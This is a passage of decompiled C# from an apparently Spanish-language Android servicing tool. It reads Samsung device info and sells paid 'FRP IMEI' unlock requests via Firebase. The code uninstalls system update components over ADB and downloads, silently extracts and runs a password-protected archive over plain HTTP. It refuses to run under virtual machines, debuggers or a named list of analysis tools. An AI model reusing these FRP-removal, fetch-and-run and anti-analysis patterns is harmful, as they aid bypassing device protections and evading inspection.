						MessageBox.Show("❌ Error: " + ex.Message);
					}
					finally
					{
						this.processRunning = false;
						this.AplicarPermisosDesdeFirebasePorPlan();
						this.btnCancelarProceso.Enabled = false;
					}
					this.processRunning = false;
					this.btnCancelarProceso.Enabled = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
				}
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000EBB4 File Offset: 0x0000CDB4
		private void btnReadDwlSm_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución.");
			}
			else
			{
				this.UpdateComPortList();
				bool flag2 = this.cmbPuertos.SelectedItem == null || this.cmbPuertos.SelectedItem.ToString().Contains("No hay puertos");
				if (flag2)
				{
					MessageBox.Show("Por favor selecciona un puerto COM válido.");
				}
				else
				{
					this.processRunning = true;
					this.cancelRequested = false;
					this.SetAllButtonsEnabled(false, null);
					this.btnCancelarProceso.Enabled = true;
					this.VerificarEntornoSeguro();
					this.InitializeProgressBar(2);
					Task.Run(delegate()
					{
						try
						{
							string puerto = "";
							this.cmbPuertos.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								puerto = this.cmbPuertos.SelectedItem.ToString().Split(new char[]
								{
									' '
								})[0];
							}));
							string respuestaFormateada = this.ObtenerInfoSamsungModoDownload(puerto);
							this.txtOutput.Invoke(new VB$AnonymousDelegate_0(delegate()
							{
								this.txtOutput.Clear();
								this.txtOutput.AppendText(respuestaFormateada + Environment.NewLine);
								this.ConsultarFirmwaresSamsungDesdeOutput(this.txtOutput);
							}));
						}
						finally
						{
							this.processRunning = false;
							this.AplicarPermisosDesdeFirebasePorPlan();
							this.btnCancelarProceso.Enabled = false;
						}
					});
				}
			}
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000EC68 File Offset: 0x0000CE68
		private string ObtenerInfoSamsungModoDownload(string puerto)
		{
			string result;
			try
			{
				using (SerialPort serialPort = new SerialPort(puerto, 115200, Parity.None, 8, StopBits.One))
				{
					serialPort.ReadTimeout = 2000;
					serialPort.WriteTimeout = 1000;
					serialPort.Open();
					byte[] bytes = Encoding.ASCII.GetBytes("DVIF");
					serialPort.Write(bytes, 0, bytes.Length);
					Thread.Sleep(500);
					string text = serialPort.ReadExisting();
					bool flag = !string.IsNullOrWhiteSpace(text);
					if (flag)
					{
						result = this.FormatearRespuestaModoDownload(text, puerto);
					}
					else
					{
						result = string.Format("⚠️ No se recibió respuesta del dispositivo en {0}.", puerto);
					}
				}
			}
			catch (Exception ex)
			{
				result = string.Format("❌ Error al leer desde el puerto {0}: {1}", puerto, ex.Message);
			}
			return result;
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000ED4C File Offset: 0x0000CF4C
		private void LeerInformacionModoDownload(string puerto)
		{
			try
			{
				using (SerialPort serialPort = new SerialPort(puerto, 115200, Parity.None, 8, StopBits.One))
				{
					serialPort.ReadTimeout = 2000;
					serialPort.WriteTimeout = 1000;
					serialPort.Open();
					byte[] bytes = Encoding.ASCII.GetBytes("DVIF");
					serialPort.Write(bytes, 0, bytes.Length);
					Thread.Sleep(500);
					string text = serialPort.ReadExisting();
					bool flag = !string.IsNullOrWhiteSpace(text);
					if (flag)
					{
						string str = this.FormatearRespuestaModoDownload(text, puerto);
						this.txtOutput.AppendText(Environment.NewLine + str + Environment.NewLine);
					}
					else
					{
						this.txtOutput.AppendText(Environment.NewLine + "⚠️ No se recibió respuesta del dispositivo." + Environment.NewLine);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al leer en modo Download: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000EE70 File Offset: 0x0000D070
		private string FormatearRespuestaModoDownload(string respuestaCruda, string puerto)
		{
			string result;
			try
			{
				Form1._Closure$__220-0 CS$<>8__locals1 = new Form1._Closure$__220-0(CS$<>8__locals1);
				bool flag = string.IsNullOrWhiteSpace(respuestaCruda);
				if (flag)
				{
					result = "⚠️ Respuesta vacía o nula.";
				}
				else
				{
					CS$<>8__locals1.$VB$Local_datos = new Dictionary<string, string>();
					string[] array = respuestaCruda.Replace("@#", "").Split(new char[]
					{
						';'
					});
					foreach (string text in array)
					{
						bool flag2 = text.Contains("=");
						if (flag2)
						{
							string[] array3 = text.Split(new char[]
							{
								'='
							});
							bool flag3 = array3.Length == 2;
							if (flag3)
							{
								CS$<>8__locals1.$VB$Local_datos[array3[0].Trim()] = array3[1].Trim();
							}
						}
					}
					VB$AnonymousDelegate_2<string, string> vb$AnonymousDelegate_ = (string key) => CS$<>8__locals1.$VB$Local_datos.ContainsKey(key) ? CS$<>8__locals1.$VB$Local_datos[key] : "N/A";
					StringBuilder stringBuilder = new StringBuilder();
					stringBuilder.AppendLine(string.Format("Searching USB Flash interface... {0} detected", puerto));
					stringBuilder.AppendLine("==========Phone info==========");
					stringBuilder.AppendLine(string.Format("model: {0}", vb$AnonymousDelegate_("MODEL")));
					stringBuilder.AppendLine(string.Format("BL : {0}", vb$AnonymousDelegate_("VER")));
					stringBuilder.AppendLine(string.Format("carrierid: {0}", vb$AnonymousDelegate_("SALES")));
					stringBuilder.AppendLine(string.Format("Device ID: {0}", vb$AnonymousDelegate_("DID")));
					stringBuilder.AppendLine("==========Flash info==========");
					stringBuilder.AppendLine(string.Format("Vendor: {0}", vb$AnonymousDelegate_("VENDOR")));
					stringBuilder.AppendLine(string.Format("Product: {0}", vb$AnonymousDelegate_("PRODUCT")));
					stringBuilder.AppendLine(string.Format("Unique Number: {0}", vb$AnonymousDelegate_("UN")));
					stringBuilder.AppendLine(string.Format("FW Version: {0}", vb$AnonymousDelegate_("FWVER")));
					stringBuilder.AppendLine(string.Format("Capacity: {0} Gb", vb$AnonymousDelegate_("CAPA")));
					stringBuilder.AppendLine();
					stringBuilder.AppendLine(string.Format("Done with Tstool [{0},Info]", vb$AnonymousDelegate_("MODEL")));
					result = stringBuilder.ToString();
				}
			}
			catch (Exception ex)
			{
				result = "❌ Error al formatear respuesta: " + ex.Message;
			}
			return result;
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000F0F8 File Offset: 0x0000D2F8
		private async void btnStartScrcpy_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.processRunning = true;
				this.cancelRequested = false;
				this.SetAllButtonsEnabled(false, null);
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				try
				{
					List<string> devices = this.GetAdbDevices();
					bool flag2 = devices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
					if (flag2)
					{
						MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
					}
					else
					{
						string storagePath = "C:\\Users\\Public\\Libraries";
						string extractPath = Path.Combine(storagePath, "scrcpy_temp");
						string zipPath = Path.Combine(storagePath, "Display.7z");
						string scrcpyExePath = Path.Combine(extractPath, "display.exe");
						bool flag3 = !File.Exists(scrcpyExePath);
						if (flag3)
						{
							this.txtOutput.AppendText("\ud83d\udd04 Display no encontrado. Preparando recursos..." + Environment.NewLine);
							bool flag4 = !File.Exists(zipPath);
							if (flag4)
							{
								bool exito = await this.DownloadFileSimple("http://reparacionesdecelular.com/up/apk/Display.7z", zipPath);
								if (!exito)
								{
									this.txtOutput.AppendText("❌ No se pudo descargar Display.7z." + Environment.NewLine);
									return;
								}
							}
							string password = "dd20cd91-d35f-4958-884a-61a7e2f76281";
							if (Directory.Exists(extractPath))
							{
								Directory.Delete(extractPath, true);
							}
							Directory.CreateDirectory(extractPath);
							this.ExtractRomFileWith7Zip("Display", password, extractPath);
						}
						string[] posiblesScrcpy = Directory.GetFiles(extractPath, "display.exe", SearchOption.AllDirectories);
						if (posiblesScrcpy.Length == 0)
						{
							MessageBox.Show("❌ display no se extrajo correctamente.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						}
						else
						{
							scrcpyExePath = posiblesScrcpy[0];
							string arguments = "--no-audio --max-size 480 --video-bit-rate 500K --max-fps 10";
							Process.Start(scrcpyExePath, arguments);
							this.txtOutput.AppendText("✅ Duplicar Pantalla iniciada." + Environment.NewLine);
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show("Error al iniciar scrcpy: " + ex.Message);
				}
				finally
				{
					this.processRunning = false;
					this.AplicarPermisosDesdeFirebasePorPlan();
					this.btnCancelarProceso.Enabled = false;
				}
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000F140 File Offset: 0x0000D340
		public void ExtractRomFileWith7Zip(string nombreArchivo, string password, string directorioDestino)
		{
			string arg = Path.Combine("C:\\Users\\Public\\Libraries", string.Format("{0}.7z", nombreArchivo));
			string fileName = "C:\\Tstool\\7z.exe";
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = fileName,
				Arguments = string.Format("x \"{0}\" -p{1} -o\"{2}\" -y", arg, password, directorioDestino),
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			Process process = Process.Start(startInfo);
			process.WaitForExit();
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000F1BC File Offset: 0x0000D3BC
		private void btnPushScrcpyServer_Click(object sender, EventArgs e)
		{
			string text = Path.Combine(Application.StartupPath, "scrcpy-server");
			bool flag = File.Exists(text);
			if (flag)
			{
				this.ExecuteAdbCommand(string.Format("push \"{0}\" /data/local/tmp/", text));
				this.txtOutput.AppendText("✅ scrcpy-server enviado." + Environment.NewLine);
			}
			else
			{
				MessageBox.Show("scrcpy-server no encontrado.");
			}
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000F221 File Offset: 0x0000D421
		private void btnRunScrcpyServer_Click(object sender, EventArgs e)
		{
			this.ExecuteAdbCommand("shell CLASSPATH=/data/local/tmp/scrcpy-server app_process / com.genymobile.scrcpy.Server 1.25");
			this.txtOutput.AppendText("✅ scrcpy-server ejecutado en el dispositivo." + Environment.NewLine);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000F24C File Offset: 0x0000D44C
		private void btnTurnOffDisplay_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					this.ExecuteAdbCommand("shell input keyevent 26");
					this.txtOutput.AppendText("✅ Pantalla apagada." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000F2E0 File Offset: 0x0000D4E0
		private void btnTurnOffWifi_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					this.ExecuteAdbCommand("shell svc wifi disable");
					this.txtOutput.AppendText("✅ Wi-Fi desactivado." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000F374 File Offset: 0x0000D574
		private void btnOpenSettings_Click(object sender, EventArgs e)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "adb";
				process.StartInfo.Arguments = "shell am start -a android.settings.SETTINGS";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.RedirectStandardError = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				string str = process.StandardOutput.ReadToEnd();
				string text = process.StandardError.ReadToEnd();
				process.WaitForExit();
				this.txtOutput.AppendText("\ud83d\udd27 Abriendo Settings..." + Environment.NewLine);
				this.txtOutput.AppendText(str + Environment.NewLine);
				bool flag = !string.IsNullOrWhiteSpace(text);
				if (flag)
				{
					this.txtOutput.AppendText("⚠ Error: " + text + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al intentar abrir ajustes: " + ex.Message);
			}
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000F49C File Offset: 0x0000D69C
		private void btnComandosShizuku_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			try
			{
				List<string> adbDevices = this.GetAdbDevices();
				bool flag = adbDevices.Count == 0 || this.cmbDevicesAdb.SelectedItem == null;
				if (flag)
				{
					MessageBox.Show("No se ha detectado ningún dispositivo ADB. Por favor, conecta un dispositivo.");
				}
				else
				{
					bool flag2 = this.cmbDevicesAdb.SelectedItem != null;
					if (flag2)
					{
						string selectedDevice = this.cmbDevicesAdb.SelectedItem.ToString();
						this.EjecutarComandoConShizukuPrivilegiado("pm uninstall --user 0 com.google.android.configupdater", selectedDevice);
						this.EjecutarComandoConShizukuPrivilegiado("pm uninstall --user 0 com.android.dynsystem", selectedDevice);
					}
					else
					{
						MessageBox.Show("No se ha seleccionado ningún dispositivo.");
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0000F554 File Offset: 0x0000D754
		private void EjecutarComandoConShizukuShell(string comando, string selectedDevice)
		{
			try
			{
				string command = string.Format("-s {0} shell CLASSPATH=/data/local/tmp/shizuku.jar app_process /system/bin moe.shizuku.shell.Shell \"{1}\"", selectedDevice, comando);
				this.ExecuteAdbCommand(command);
				this.txtOutput.AppendText("✅ Ejecutado con Shizuku Shell: " + comando + Environment.NewLine);
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText("❌ Error ejecutando con Shizuku Shell: " + ex.Message + Environment.NewLine);
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x0000F5D8 File Offset: 0x0000D7D8
		private void EjecutarComandoConShizukuPrivilegiado(string comando, string selectedDevice)
		{
			try
			{
				string command = string.Format("-s {0} shell /data/local/tmp/shizuku_starter {1}", selectedDevice, comando);
				this.ExecuteAdbCommand(command);
				this.txtOutput.AppendText("✅ Ejecutado con Shizuku: " + comando + Environment.NewLine);
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText("❌ Error ejecutando con Shizuku: " + ex.Message + Environment.NewLine);
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000F65C File Offset: 0x0000D85C
		private void ExecuteAdbCommand(string command)
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("adb.exe", command)
				{
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					CreateNoWindow = true
				};
				using (Process process = Process.Start(startInfo))
				{
					string str = process.StandardOutput.ReadToEnd();
					string text = process.StandardError.ReadToEnd();
					process.WaitForExit();
					this.txtOutput.AppendText(str + Environment.NewLine);
					bool flag = !string.IsNullOrEmpty(text);
					if (flag)
					{
						this.txtOutput.AppendText("❌ Error: " + text + Environment.NewLine);
					}
				}
			}
			catch (Exception ex)
			{
				this.txtOutput.AppendText("❌ Excepción: " + ex.Message + Environment.NewLine);
			}
		}

		// Token: 0x0600010D RID: 269 RVA: 0x0000F764 File Offset: 0x0000D964
		public string GetSha256(string input)
		{
			string result;
			using (SHA256 sha = SHA256.Create())
			{
				byte[] bytes = Encoding.UTF8.GetBytes(input);
				byte[] value = sha.ComputeHash(bytes);
				result = BitConverter.ToString(value).Replace("-", "").ToLowerInvariant();
			}
			return result;
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0000F7C8 File Offset: 0x0000D9C8
		public bool VerificarEntornoSeguro()
		{
			bool flag = this.EstaEnMaquinaVirtual();
			bool result;
			if (flag)
			{
				MessageBox.Show("⚠️ No se permite ejecutar en entornos virtuales.");
				result = false;
			}
			else
			{
				bool flag2 = this.EstaSiendoAnalizado();
				if (flag2)
				{
					MessageBox.Show("⚠️ Herramientas de análisis detectadas. El programa se cerrará.");
					result = false;
				}
				else
				{
					bool isAttached = Debugger.IsAttached;
					if (isAttached)
					{
						MessageBox.Show("❌ No se permite ejecutar en modo depuración.");
						result = false;
					}
					else
					{
						result = true;
					}
				}
			}
			return result;
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000F828 File Offset: 0x0000DA28
		public bool EstaEnMaquinaVirtual()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
				{
					try
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							string text = managementObject["Manufacturer"].ToString().ToLower();
							string text2 = managementObject["Model"].ToString().ToLower();
							bool flag = text.Contains("vmware") || text.Contains("virtualbox") || text.Contains("xen") || (text.Contains("microsoft corporation") && text2.Contains("virtual")) || text2.Contains("virtualbox") || text2.Contains("vmware");
							if (flag)
							{
								return true;
							}
						}
					}
					finally
					{
						ManagementObjectCollection.ManagementObjectEnumerator enumerator;
						if (enumerator != null)
						{
							((IDisposable)enumerator).Dispose();
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000F964 File Offset: 0x0000DB64
		public bool EstaSiendoAnalizado()
		{
			string[] array = new string[]
			{
				"wireshark",
				"procmon",
				"processhacker",
				"fiddler",
				"tcpview",
				"netmon",
				"ollydbg",
				"x64dbg",
				"ida",
				"ghidra",
				"dumpcap",
				"networkminer",
				"windbg",
				"scylla",
				"cheatengine"
			};
			try
			{
				foreach (Process process in Process.GetProcesses())
				{
					foreach (string value in array)
					{
						bool flag = process.ProcessName.ToLower().Contains(value);
						if (flag)
						{
							return true;
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000FA84 File Offset: 0x0000DC84
		private string CalcularMD5(string archivo)
		{
			string result;
			using (MD5 md = MD5.Create())
			{
				using (FileStream fileStream = File.OpenRead(archivo))
				{
					byte[] value = md.ComputeHash(fileStream);
					result = BitConverter.ToString(value).Replace("-", "").ToLowerInvariant();
				}
			}
			return result;
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000FAFC File Offset: 0x0000DCFC
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				string path = "C:\\Users\\Public\\Libraries\\scrcpy_temp";
				bool flag = Directory.Exists(path);
				if (flag)
				{
					Directory.Delete(path, true);
					this.txtOutput.AppendText("\ud83e\uddf9 Archivos temporales de scrcpy eliminados correctamente." + Environment.NewLine);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000113 RID: 275 RVA: 0x0000FB64 File Offset: 0x0000DD64
		private void btnSolicitarLicenciaporWhats_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				this.VerificarEntornoSeguro();
				string firebaseUid = MySettingsProperty.Settings.FirebaseUid;
				string userEmail = MySettingsProperty.Settings.UserEmail;
				string message = string.Format("¡Hola! Me gustaría solicitar la activación de mi cuenta.{0}", Environment.NewLine) + string.Format("\ud83d\udce7 Email: {0}{1}", userEmail, Environment.NewLine) + string.Format("\ud83c\udd94 UID: {0}", firebaseUid);
				this.SendMessageToWhatsApp("526635137946", message);
				this.processRunning = false;
				this.btnCancelarProceso.Enabled = false;
				this.AplicarPermisosDesdeFirebasePorPlan();
			}
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000FC28 File Offset: 0x0000DE28
		private void SendMessageToWhatsApp(string phoneNumber, string message)
		{
			try
			{
				string arg = Uri.EscapeDataString(message);
				string fileName = string.Format("https://wa.me/{0}?text={1}", phoneNumber, arg);
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = fileName,
					UseShellExecute = true
				};
				Process.Start(startInfo);
			}
			catch (Exception ex)
			{
				MessageBox.Show(string.Format("Error al abrir WhatsApp: {0}", ex.Message), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}

		// Token: 0x06000115 RID: 277 RVA: 0x0000FCA8 File Offset: 0x0000DEA8
		private async void btnSolicitarFRPIMEI_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			string textoPlano = this.LimpiarTexto(this.txtOutput.Text);
			string uid = MySettingsProperty.Settings.FirebaseUid;
			string idToken = MySettingsProperty.Settings.FirebaseIdToken;
			string modelo = this.ExtraerValorDesdeTexto(textoPlano, "model:");
			string baseband = this.ExtraerValorDesdeTexto(textoPlano, "Baseband :");
			string serial = this.ExtraerValorDesdeTexto(textoPlano, "Serial Number :");
			string imei = this.ExtraerValorDesdeTexto(textoPlano, "IMEI:");
			bool flag = string.IsNullOrEmpty(modelo) || string.IsNullOrEmpty(baseband);
			if (flag)
			{
				MessageBox.Show("❌ No se pudo obtener modelo o baseband del dispositivo.");
			}
			else
			{
				string identificador = "";
				bool flag2 = !string.IsNullOrEmpty(imei);
				if (flag2)
				{
					identificador = imei;
				}
				else
				{
					bool flag3 = !string.IsNullOrEmpty(serial);
					if (!flag3)
					{
						MessageBox.Show("❌ No se encontró IMEI ni número de serie.");
						return;
					}
					identificador = serial;
				}
				int precioServicio = 7;
				string urlCreditos = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/credits.json?auth={1}", uid, idToken);
				using (HttpClient client = new HttpClient())
				{
					string resp = await client.GetStringAsync(urlCreditos);
					int creditos = Conversions.ToInteger(resp);
					if (creditos < precioServicio)
					{
						MessageBox.Show("❌ No tienes créditos suficientes para este servicio.");
					}
					else
					{
						StringContent contenido = new StringContent((checked(creditos - precioServicio)).ToString(), Encoding.UTF8, "application/json");
						await client.PutAsync(urlCreditos, contenido);
						JObject ticket = new JObject
						{
							{
								"servicio",
								"FRP IMEI V1"
							},
							{
								"estado",
								"pendiente"
							},
							{
								"modelo",
								modelo
							},
							{
								"baseband",
								baseband
							},
							{
								"identificador",
								identificador
							},
							{
								"imei",
								imei
							},
							{
								"serial",
								serial
							},
							{
								"fecha",
								DateTime.UtcNow.ToString("s")
							}
						};
						string urlTickets = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/tickets.json?auth={1}", uid, idToken);
						StringContent contentTicket = new StringContent(ticket.ToString(), Encoding.UTF8, "application/json");
						await client.PostAsync(urlTickets, contentTicket);
						MessageBox.Show("✅ Servicio solicitado correctamente. Se descontaron 15 créditos.");
					}
				}
			}
		}

		// Token: 0x06000116 RID: 278 RVA: 0x0000FCF0 File Offset: 0x0000DEF0
		private async void CargarTicketsUsuario()
		{
			try
			{
				string uid = MySettingsProperty.Settings.FirebaseUid;
				string idToken = MySettingsProperty.Settings.FirebaseIdToken;
				string url = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/tickets.json?auth={1}", uid, idToken);
				using (HttpClient client = new HttpClient())
				{
					string json = await client.GetStringAsync(url);
					if (string.IsNullOrWhiteSpace(json) || Operators.CompareString(json.Trim(), "null", false) == 0)
					{
						MessageBox.Show("No se encontraron tickets.");
					}
					else
					{
						JObject tickets = JObject.Parse(json);
						DataTable tabla = new DataTable();
						tabla.Columns.Add("ID");
						tabla.Columns.Add("Servicio");
						tabla.Columns.Add("Modelo");
						tabla.Columns.Add("Baseband");
						tabla.Columns.Add("Identificador");
						tabla.Columns.Add("Estado");
						tabla.Columns.Add("Fecha");
						try
						{
							foreach (KeyValuePair<string, JToken> item in tickets)
							{
								string ticketId = item.Key;
								JToken ticketData = item.Value;
								tabla.Rows.Add(new object[]
								{
									ticketId,
									ticketData["servicio"],
									ticketData["modelo"],
									ticketData["baseband"],
									ticketData["identificador"],
									ticketData["estado"],
									ticketData["fecha"]
								});
							}
						}
						finally
						{
							IEnumerator<KeyValuePair<string, JToken>> enumerator;
							if (enumerator != null)
							{
								enumerator.Dispose();
							}
						}
						this.dgvTickets.DataSource = tabla;
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al cargar tickets: " + ex.Message);
			}
		}

		// Token: 0x06000117 RID: 279 RVA: 0x0000FD29 File Offset: 0x0000DF29
		private void btnVerTickets_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.CargarTicketsUsuario();
		}

		// Token: 0x06000118 RID: 280 RVA: 0x0000FD3C File Offset: 0x0000DF3C
		private async Task MostrarCreditosActuales()
		{
			try
			{
				string uid = MySettingsProperty.Settings.FirebaseUid;
				string idToken = MySettingsProperty.Settings.FirebaseIdToken;
				string url = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/credits.json?auth={1}", uid, idToken);
				using (HttpClient client = new HttpClient())
				{
					string respuesta = await client.GetStringAsync(url);
					int creditos = string.IsNullOrWhiteSpace(respuesta) ? 0 : Conversions.ToInteger(respuesta);
					this.lblCreditosActuales.Text = string.Format("Créditos actuales: {0}", creditos);
				}
			}
			catch (Exception ex)
			{
				this.lblCreditosActuales.Text = "Error al obtener créditos";
			}
		}

		// Token: 0x06000119 RID: 281 RVA: 0x0000FD80 File Offset: 0x0000DF80
		private void btnRecarga100_Click(object sender, EventArgs e)
		{
			Process.Start("https://mpago.la/2Zn6b9A");
		}

		// Token: 0x0600011A RID: 282 RVA: 0x0000FD8E File Offset: 0x0000DF8E
		private void btnRecarga500_Click(object sender, EventArgs e)
		{
			Process.Start("https://mpago.la/2kqJwxR");
		}

		// Token: 0x0600011B RID: 283 RVA: 0x0000FD9C File Offset: 0x0000DF9C
		private void btnRecarga200_Click(object sender, EventArgs e)
		{
			Process.Start("https://mpago.la/ghi789");
		}

		// Token: 0x0600011C RID: 284 RVA: 0x0000FDAC File Offset: 0x0000DFAC
		private async void CargarHistorialRecargas()
		{
			try
			{
				string uid = MySettingsProperty.Settings.FirebaseUid;
				string idToken = MySettingsProperty.Settings.FirebaseIdToken;
				string url = string.Format("https://tstool-5ed2a-default-rtdb.firebaseio.com/usuarios/{0}/recargas.json?auth={1}", uid, idToken);
				using (HttpClient client = new HttpClient())
				{
					string json = await client.GetStringAsync(url);
					if (string.IsNullOrWhiteSpace(json) || Operators.CompareString(json.Trim(), "null", false) == 0)
					{
						MessageBox.Show("No se encontraron recargas.");
					}
					else
					{
						JObject recargas = JObject.Parse(json);
						DataTable tabla = new DataTable();
						tabla.Columns.Add("ID");
						tabla.Columns.Add("Monto");
						tabla.Columns.Add("Fecha");
						tabla.Columns.Add("Método");
						tabla.Columns.Add("Descripción");
						try
						{
							foreach (KeyValuePair<string, JToken> item in recargas)
							{
								string id = item.Key;
								JToken datos = item.Value;
								tabla.Rows.Add(new object[]
								{
									id,
									datos["monto"],
									datos["fecha"],
									datos["metodo"],
									datos["descripcion"]
								});
							}
						}
						finally
						{
							IEnumerator<KeyValuePair<string, JToken>> enumerator;
							if (enumerator != null)
							{
								enumerator.Dispose();
							}
						}
						this.dgvRecargas.DataSource = tabla;
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error al cargar historial de recargas: " + ex.Message);
			}
		}

		// Token: 0x0600011D RID: 285 RVA: 0x0000FDE5 File Offset: 0x0000DFE5
		private void btnVerHistorialRecargas_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.CargarHistorialRecargas();
		}

		// Token: 0x0600011E RID: 286 RVA: 0x0000FDF8 File Offset: 0x0000DFF8
		private void AbrirPanelAdministrador()
		{
			string right = "yodesbloqueoyreparo@gmail.com";
			string right2 = "qVzqwOOMsBfsf8JNyOtR2lMXgQF2";
			bool flag = Operators.CompareString(MySettingsProperty.Settings.UserEmail, right, false) == 0 && Operators.CompareString(MySettingsProperty.Settings.FirebaseUid, right2, false) == 0;
			if (flag)
			{
				FormAdminRecargas formAdminRecargas = new FormAdminRecargas();
				formAdminRecargas.Show();
			}
			else
			{
				MessageBox.Show("⚠️ Acceso restringido al administrador.");
			}
		}

		// Token: 0x0600011F RID: 287 RVA: 0x0000FE5D File Offset: 0x0000E05D
		private void btnGestionarCreditos_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			this.AbrirPanelAdministrador();
		}

		// Token: 0x06000120 RID: 288 RVA: 0x0000FE70 File Offset: 0x0000E070
		private void btnAbrirGestorApps_Click(object sender, EventArgs e)
		{
			this.VerificarEntornoSeguro();
			bool flag = this.cmbDevicesAdb.SelectedItem == null;
			if (flag)
			{
				MessageBox.Show("Selecciona un dispositivo primero.");
			}
			else
			{
				new FrmGestorAppsUsuario
				{
					SelectedDevice = this.cmbDevicesAdb.SelectedItem.ToString()
				}.Show();
			}
		}

		// Token: 0x06000121 RID: 289 RVA: 0x0000FEC8 File Offset: 0x0000E0C8
		private async void btnRkchip_Click(object sender, EventArgs e)
		{
			bool flag = this.processRunning;
			if (flag)
			{
				MessageBox.Show("⚠ Ya hay un proceso en ejecución. Por favor, espera a que termine.");
			}
			else
			{
				this.btnCancelarProceso.Enabled = true;
				this.VerificarEntornoSeguro();
				this.ProgressBar1.Invoke(new VB$AnonymousDelegate_0(delegate()
				{
					this.InitializeProgressBar(2);
					this.UpdateProgressBar();
				}));
				try
				{
					string storagePath = "C:\\Users\\Public\\Libraries";
					string extractPath = Path.Combine(storagePath, "rktool");
